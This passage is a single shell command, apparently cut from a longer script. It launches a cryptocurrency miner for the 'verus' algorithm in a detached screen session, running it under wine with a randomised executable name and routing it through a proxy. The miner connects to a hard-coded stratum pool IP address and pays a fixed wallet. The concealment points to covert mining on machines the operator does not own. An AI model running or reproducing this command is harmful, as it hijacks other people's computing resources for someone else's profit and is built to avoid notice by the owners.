...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://34.220.50.19:8000 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.beluttgacor -p d=4 -t 4 --proxy=$proxy_url"
